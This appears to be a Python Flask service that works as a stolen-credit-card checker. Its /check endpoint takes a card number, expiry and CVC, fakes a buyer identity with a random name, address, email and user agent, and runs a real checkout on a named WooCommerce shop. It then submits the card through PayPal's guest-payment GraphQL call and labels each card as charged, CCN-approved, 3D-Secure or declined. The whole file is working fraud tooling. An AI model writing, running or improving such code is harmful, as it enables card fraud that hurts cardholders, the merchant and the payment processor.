import os
import requests
import re
import time
import random
import string
from flask import Flask, request, jsonify
from requests_toolbelt.multipart.encoder import MultipartEncoder
import user_agent

# Initialize the Flask app
app = Flask(__name__)

# --- Helper functions from your original script ---
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    index = random.randint(0, len(cities) - 1)
    city = cities[index]
    state = states[index]
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = zip_codes[index]
    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=15))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone_number():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

# --- Main checking logic refactored into a function ---
def check_card(card_details):
    try:
        parts = card_details.strip().split('|')
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]

        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" in yy:
            yy = yy.split("20")[1]

        user = user_agent.generate_user_agent()
        r = requests.session()
        
        # Generate random user data
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone_number()
        
        # --- Start of Requests Sequence from your script ---
        # 1. Add to cart
        multipart_data = MultipartEncoder(fields={'quantity': '1', 'add-to-cart': '4451'})
        headers_cart = {'authority': 'switchupcb.com', 'origin': 'https://switchupcb.com', 'referer': 'https://switchupcb.com/shop/i-buy/', 'user-agent': user, 'content-type': multipart_data.content_type}
        r.post('https://switchupcb.com/shop/i-buy/', headers=headers_cart, data=multipart_data)

        # 2. Go to checkout and get tokens
        headers_checkout = {'authority': 'switchupcb.com', 'referer': 'https://switchupcb.com/cart/', 'user-agent': user}
        response_checkout = r.get('https://switchupcb.com/checkout/', headers=headers_checkout)
        
        try:
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
        except AttributeError:
            return {"status": "error", "message": "Failed to scrape checkout page tokens.", "card": card_details}

        # 3. Create PayPal Order
        headers_create_order = {'authority': 'switchupcb.com', 'accept': '*/*', 'origin': 'https://switchupcb.com', 'referer': 'https://switchupcb.com/checkout/', 'user-agent': user}
        json_data_create = {
            'nonce': create, 'context': 'checkout', 'order_id': '0', 'payment_method': 'ppcp-gateway', 'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_country=US&billing_address_1={street_address}&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
        }
        response_create = r.post('https://switchupcb.com/?wc-ajax=ppc-create-order', headers=headers_create_order, json=json_data_create)
        
        order_data = response_create.json()
        if 'data' not in order_data or 'id' not in order_data['data']:
            return {"status": "error", "message": "Failed to create PayPal order ID.", "card": card_details}
        
        paypal_id = order_data['data']['id']

        # 4. Final GraphQL payment request to PayPal
        headers_graphql = {
            'authority': 'www.paypal.com', 'accept': '*/*', 'content-type': 'application/json',
            'origin': 'https://www.paypal.com', 'user-agent': user
        }
        json_data_graphql = {
            'query': 'mutation payWithCard($token: String!, $card: CardInput!) { approveGuestPaymentWithCreditCard(token: $token, card: $card) { flags { is3DSecureRequired } } }',
            'variables': {
                'token': paypal_id,
                'card': {'cardNumber': n, 'expirationDate': f'{mm}/20{yy}', 'securityCode': cvc},
            }
        }
        response_final = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers_graphql, json=json_data_graphql)
        last = response_final.text
        
        # --- Response handling ---
        message = ""
        status = ""
        if ('ADD_SHIPPING_ERROR' in last or '"status": "succeeded"' in last or 'Thank You For Donation.' in last):
            message = "CHARGE ✅"
            status = "Approved"
        elif 'is3DSecureRequired' in last:
            message = "OTP 💥 [3D]"
            status = "Approved (3D Secure)"
        elif 'INVALID_SECURITY_CODE' in last:
            message = "APPROVED CCN ✅"
            status = "Approved (CCN)"
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            message = "APPROVED! ✅ - [EXISTING_ACCOUNT_RESTRICTED]"
            status = "Approved"
        elif 'INVALID_BILLING_ADDRESS' in last:
            message = "APPROVED! ✅ - [inv_address]"
            status = "Approved"
        else:
            message = f"DECLINED ❌"
            status = "Declined"

        return {"status": status, "message": message, "card": card_details, "response_text": last}

    except Exception as e:
        return {"status": "error", "message": str(e), "card": card_details}

# --- API Endpoint ---
@app.route('/check', methods=['GET'])
def api_check():
    # Get 'cc' parameter from the URL query string
    card_info = request.args.get('cc')
    
    if not card_info:
        return jsonify({"error": "Missing 'cc' parameter. Use format: /check?cc=NUMBER|MM|YY|CVC"}), 400
    
    if len(card_info.split('|')) != 4:
        return jsonify({"error": "Invalid 'cc' format. Required format: NUMBER|MM|YY|CVC"}), 400
    
    result = check_card(card_info)
    
    return jsonify(result)

if __name__ == '__main__':
    # The port is automatically assigned by Render. This is for local testing.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
